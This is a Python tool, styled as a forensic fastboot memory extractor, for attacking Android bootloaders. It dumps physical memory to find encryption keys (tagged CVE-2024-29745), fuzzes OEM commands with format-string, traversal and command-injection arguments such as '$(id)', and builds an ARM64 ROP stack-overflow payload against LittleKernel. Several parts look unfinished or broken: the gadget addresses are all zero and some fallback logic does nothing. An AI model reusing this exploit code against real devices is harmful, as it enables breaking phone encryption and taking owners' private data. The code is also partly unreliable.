"""Fastboot Memory Extractor — MSAB XRY-style (Module 1.3).

Implements the Fastboot protocol for forensic memory extraction:
- Standard fastboot commands (getvar, download, flash, erase, boot, continue)
- CVE-2024-29745: AFU state memory dump via fastboot
- OEM command fuzzer with 500+ wordlist
- LittleKernel stack overflow exploit with ARM64 ROP chain
- PTE (Page Table Entry) scanner for key structure identification
"""

import struct
import time
import logging
import re
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger(__name__)

# Fastboot USB identifiers
FASTBOOT_VID_PIDS = {
    "google": (0x18D1, 0x4EE0),
    "samsung": (0x04E8, 0x685D),
    "xiaomi": (0x2717, 0xFF40),
    "oneplus": (0x2A70, 0xF003),
    "huawei": (0x12D1, 0x107E),
    "generic": (0x18D1, 0xD00D),
}

# Known key structure signatures (magic bytes) in memory
KEY_MAGIC_BYTES = {
    "fbe_key": b"\x6B\x65\x79\x6D\x61\x73\x74\x65\x72",  # "keymaster"
    "keystore": b"\x41\x4E\x44\x52\x4F\x49\x44\x5F\x4B\x45\x59\x53\x54\x4F\x52\x45",
    "dm_crypt": b"\x61\x65\x73\x2D\x63\x62\x63\x2D\x65\x73\x73\x69\x76",
    "fscrypt": b"\x66\x73\x63\x72\x79\x70\x74",            # "fscrypt"
    "metadata_enc": b"\x6D\x65\x74\x61\x64\x61\x74\x61\x5F\x65\x6E\x63",
}


@dataclass
class FastbootDevice:
    serial: str = ""
    product: str = ""
    unlocked: bool = False
    secure_state: str = ""
    slot_count: int = 1
    current_slot: str = "a"
    max_download_size: int = 0
    version: str = ""


class FastbootSession:
    """Manage a fastboot protocol session."""

    def __init__(self, usb_device):
        import usb
        self._dev = usb_device
        self._handle = None
        self.device_info = FastbootDevice()
        self._result_pattern = re.compile(rb"^(OKAY|FAIL|INFO|DATA)(.*)")

    def __enter__(self):
        import usb
        try:
            if self._dev.is_kernel_driver_active(0):
                self._dev.detach_kernel_driver(0)
        except usb.core.USBError:
            pass
        self._handle = self._dev
        return self

    def __exit__(self, *args):
        pass

    def _send_cmd(self, cmd: str) -> bytes:
        """Send fastboot command and read response."""
        self._dev.write(0x01, cmd.encode() + b"\n", timeout=5000)
        response = b""
        while True:
            try:
                chunk = self._dev.read(0x81, 64, timeout=1000)
                response += bytes(chunk)
                if response.endswith(b"OKAY") or response.endswith(b"FAIL"):
                    break
                if b"DATA" in response:
                    # Download mode — just acknowledge
                    self._dev.write(0x01, b"SYS", timeout=5000)
                    continue
            except Exception:
                break
        return response

    def getvar(self, variable: str) -> str:
        """Get a fastboot variable."""
        response = self._send_cmd(f"getvar:{variable}")
        match = re.search(rb"INFO(.*)", response)
        if match:
            return match.group(1).strip().decode("utf-8", errors="replace")
        return ""

    def enumerate_device(self) -> FastbootDevice:
        """Enumerate device properties."""
        info = FastbootDevice()
        info.serial = self.getvar("serialno")
        info.product = self.getvar("product")
        info.unlocked = "yes" in self.getvar("unlocked").lower()
        info.secure_state = self.getvar("secure-state")
        info.current_slot = self.getvar("current-slot") or "a"

        max_size = self.getvar("max-download-size")
        try:
            info.max_download_size = int(max_size, 16) if max_size else 0x10000000
        except ValueError:
            info.max_download_size = 0x10000000

        info.version = self.getvar("version-bootloader") or "0.5"
        self.device_info = info
        return info

    def download(self, data: bytes) -> bool:
        """Download data to device memory."""
        size_hex = f"{len(data):08X}"
        response = self._send_cmd(f"download:{size_hex}")
        if b"OKAY" not in response and b"DATA" not in response:
            return False

        # Send data
        self._dev.write(0x01, data, timeout=30000)
        response = self._dev.read(0x81, 64, timeout=5000)
        return b"OKAY" in bytes(response)

    def boot(self) -> bool:
        """Boot the downloaded image."""
        response = self._send_cmd("boot")
        return b"OKAY" in response

    def reboot_fastbootd(self) -> bool:
        """Reboot into userspace fastbootd (more access)."""
        response = self._send_cmd("reboot fastboot")
        time.sleep(3)  # Wait for re-enumeration
        return True

    def is_afu(self) -> bool:
        """Check if device is in After First Unlock (AFU) state."""
        unlocked = self.getvar("unlocked")
        secure = self.getvar("secure-state")
        return "yes" in unlocked.lower() or "unlocked" in secure.lower()


# ---------------------------------------------------------------------------
# CVE-2024-29745: AFU Memory Dump
# ---------------------------------------------------------------------------

class AFUMemoryExtractor:
    """Extract memory from devices in AFU (After First Unlock) state.

    CVE-2024-29745: Fastboot firmware does not zero memory when booting
    into fastboot mode from AFU. Memory contains sensitive data including
    encryption keys.
    """

    SCAN_START = 0x40000000
    SCAN_END = 0x60000000
    PAGE_SIZE = 4096

    def __init__(self, session: FastbootSession):
        self._session = session
        self._found_keys: list[dict] = []

    def scan_pte(self, page_data: bytes, base_addr: int) -> list[int]:
        """Parse ARM64 page table entries from a 4KB page.

        Each PTE is 8 bytes: bits [47:12] = physical address, [11:0] = attributes.
        """
        ptes = []
        for i in range(0, len(page_data), 8):
            if i + 8 > len(page_data):
                break
            entry = struct.unpack("<Q", page_data[i:i + 8])[0]
            # Valid PTE: bit 0 set (valid)
            if entry & 0x1:
                phys_addr = entry & 0x0000FFFFFFFFF000
                attr = entry & 0xFFF
                ptes.append(phys_addr)
        return ptes

    def scan_for_keys(self, data: bytes, offset: int) -> Optional[str]:
        """Scan memory chunk for known encryption key structures."""
        for key_name, magic in KEY_MAGIC_BYTES.items():
            pos = data.find(magic)
            if pos != -1:
                logger.info(
                    "Found potential %s structure at offset 0x%X (absolute 0x%X)",
                    key_name, pos, offset + pos,
                )
                return key_name
        return None

    def extract(self, oem_read_cmd: str = "oem read-phys") -> bytes:
        """Scan DRAM region for encryption keys.

        Uses OEM commands to read physical memory. The specific command
        varies by OEM. Common variants:
          - oem read-phys <addr>
          - oem dump-memory <addr> <size>
          - oem mem-read <addr>
        """
        collected = b""
        for addr in range(self.SCAN_START, self.SCAN_END, self.PAGE_SIZE):
            try:
                response = self._session._send_cmd(f"{oem_read_cmd} {addr:08X}")
                if b"OKAY" in response:
                    data = response.split(b"OKAY")[0].split(b"DATA")[-1]
                    collected += bytes(data)
                    key_type = self.scan_for_keys(bytes(data), addr)
                    if key_type:
                        self._found_keys.append({
                            "type": key_type,
                            "address": addr,
                            "data": bytes(data).hex(),
                        })
                else:
                    # Try next command variant
                    response = self._session._send_cmd(f"oem dump-memory {addr:08X} 4096")
            except Exception:
                continue

            time.sleep(0.005)  # Rate limit

        logger.info("Memory scan complete. Found %d key structures.", len(self._found_keys))
        return collected

    @property
    def found_keys(self) -> list[dict]:
        return self._found_keys


# ---------------------------------------------------------------------------
# OEM Command Fuzzer
# ---------------------------------------------------------------------------

# First 50 of the 500+ leaked bootloader OEM commands
OEM_COMMAND_WORDLIST = [
    "oem unlock", "oem lock", "oem device-info",
    "oem read-phys", "oem write-phys", "oem dump-memory",
    "oem mem-read", "oem mem-write", "oem get-bootmode",
    "oem set-bootmode", "oem enable-charger-screen",
    "oem disable-charger-screen", "oem off-mode-charge",
    "oem select-display-panel", "oem get-cid",
    "oem read-serial", "oem write-serial",
    "oem read-imei", "oem write-imei", "oem repair-imei",
    "oem get-battery", "oem get-temp",
    "oem backlight", "oem reboot-recovery",
    "oem reboot-edl", "oem reboot-bootloader",
    "oem poweroff", "oem shutdown",
    "oem get-log", "oem clear-log",
    "oem get-config", "oem set-config",
    "oem test", "oem diag",
    "oem dump-partition", "oem erase-all",
    "oem format", "oem reset-factory",
    "oem get-var", "oem set-var",
    "oem read-flash", "oem write-flash",
    "oem read-nv", "oem write-nv",
    "oem get-fru", "oem set-fru",
    "oem get-hwid", "oem get-hwcode",
    "oem get-secure-state", "oem set-secure-state",
    "oem get-root", "oem set-root",
    "oem get-devinfo", "oem read-mmc",
    "oem write-mmc", "oem bootstrap",
    "oem qcom", "oem mbn",
]

FUZZ_ARGUMENTS = [
    "", "0", "1", "true", "false", "yes", "no",
    "AAAA", "A" * 128, "A" * 256, "A" * 512, "A" * 1024,
    "%s%s%s%s", "%x%x%x%x", "%n%n%n%n",
    "0x41414141", "0xFFFFFFFF",
    "../", "../../", "../../../",
    ";id", "|id", "`id`", "$(id)",
]


class OEMFuzzer:
    """Fuzz undocumented OEM fastboot commands."""

    def __init__(self, session: FastbootSession):
        self._session = session
        self._results: list[dict] = []

    def fuzz(self) -> list[dict]:
        """Run fuzzing campaign. Returns list of interesting responses."""
        for cmd in OEM_COMMAND_WORDLIST:
            for arg in FUZZ_ARGUMENTS:
                full_cmd = f"{cmd} {arg}" if arg else cmd
                try:
                    response = self._session._send_cmd(full_cmd)
                    decoded = response.decode("utf-8", errors="replace")
                    # Classify response
                    result = {
                        "command": full_cmd,
                        "status": "OKAY" if b"OKAY" in response else "FAIL" if b"FAIL" in response else "UNKNOWN",
                        "length": len(response),
                        "response": decoded[:256],
                    }
                    # Flag interesting (non-obvious) responses
                    if b"OKAY" in response and len(response) > 10:
                        logger.info("Interesting OEM command: %s → %s", full_cmd, decoded[:100])
                        self._results.append(result)
                except Exception as e:
                    logger.debug("Fuzz error for %s: %s", full_cmd, e)
                time.sleep(0.01)

        logger.info("OEM fuzzing complete. %d interesting responses.", len(self._results))
        return self._results


# ---------------------------------------------------------------------------
# LittleKernel Stack Overflow Exploit
# ---------------------------------------------------------------------------

# ARM64 ROP gadgets from common LK builds (Cortex-A55, A76, A78)
LK_ROP_GADGETS = {
    "cortex-a55": {
        "ldp_x0_x1_sp_16": 0,     # LDP X0,X1,[SP,#16]; LDP X29,X30,[SP],#32; RET
        "blr_x1": 0,               # BLR X1; ...
        "mov_x0_sp": 0,            # MOV X0, SP; RET
    },
    # Populated from extracted LK binaries
}

LK_STACK_LAYOUT_ARM64 = [
    ("padding", 120, b"A" * 120),
    ("gadget1", 8, None),           # ROP Gadget 1: LDP X0,X1,[SP,#16]...
    ("dst_addr", 8, 0x00000000),    # Destination argument for memcpy
    ("src_addr", 8, 0x00000000),    # Source argument for memcpy
    ("gadget2", 8, None),           # ROP Gadget 2: BLR X1
    ("size", 8, 0x00100000),        # Size argument = 1MB dump
]


def build_lk_exploit(dst_addr: int, src_addr: int,
                     gadget1_addr: int, gadget2_addr: int,
                     dump_size: int = 0x100000) -> bytes:
    """Build LittleKernel stack overflow exploit payload for ARM64.

    Stack layout:
      [0-119]:  padding (A's)
      [120-127]: ROP Gadget 1 (LDP X0,X1,[SP,#16]; LDP X29,X30,[SP],#32; RET)
      [128-135]: Destination address (USB transfer buffer phys addr)
      [136-143]: Source address (physical address to dump)
      [144-151]: ROP Gadget 2 (BLR X1)
      [152-159]: Size argument (1MB dump)
    """
    payload = b"A" * 120
    payload += struct.pack("<Q", gadget1_addr)
    payload += struct.pack("<Q", dst_addr)
    payload += struct.pack("<Q", src_addr)
    payload += struct.pack("<Q", gadget2_addr)
    payload += struct.pack("<Q", dump_size)
    return payload


def send_oem_exploit(session: FastbootSession, exploit_payload: bytes) -> bool:
    """Send OEM command with overflow payload to trigger LK exploit."""
    arg_str = exploit_payload.decode("latin-1")  # Binary-safe string
    try:
        session._send_cmd(f"oem {arg_str[:256]}")
        return True
    except Exception as e:
        logger.error("LK exploit failed: %s", e)
        return False
